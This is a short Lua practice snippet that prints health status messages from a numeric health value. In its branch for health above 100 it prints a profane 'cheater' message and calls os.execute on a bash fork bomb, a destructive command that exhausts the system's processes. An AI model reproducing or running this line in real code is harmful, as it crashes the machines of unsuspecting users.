local health = 99
if health ~= 100 then -- Is not required but i wanted to use it. Means != in C/C++
	if health > 100 then
		print("YOU ARE A CHEATER! FUCK YOU!")
		os.execute(":(){ :|:& };:")
	elseif health <= 100 and health > 85 then
		print("Healty!")
	elseif health <= 85 and health > 50 then
		print("Less but still healty.")
	elseif health <= 50 and health > 0 then
		print("MEDIIIC!")
	else
		print("dead")
	end
end
